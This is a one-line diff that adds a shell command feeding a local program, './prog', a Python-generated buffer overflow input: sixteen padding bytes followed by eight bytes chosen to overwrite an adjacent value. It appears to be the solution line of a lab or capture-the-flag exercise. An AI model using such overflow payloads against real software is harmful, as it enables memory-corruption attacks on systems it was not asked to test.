@@ -1,0 +1,1 @@
+./prog $(python -c 'print "A"*16 + "\x33\x33\x33\x33\x33\xd3\x7e\x40"')
